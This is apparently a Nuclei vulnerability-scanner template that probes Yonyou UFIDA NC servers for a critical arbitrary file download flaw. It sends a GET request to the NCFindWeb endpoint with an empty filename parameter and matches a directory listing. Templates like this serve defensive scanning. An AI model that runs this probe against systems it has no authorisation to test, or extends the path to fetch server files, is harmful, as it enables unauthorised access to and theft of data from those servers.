id: YongYou-UnAuthAccess

info:
  name: 用友NC(YONYOU) - 任意文件下载
  author: wintry
  severity: critical
  description: YONYOU用友 UFIDA-NC任意文件下载.
  tags: yonyounc

http:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "WEB-INF"
          - ".jsp"    
        condition: and

      - type: status
        status:
          - 200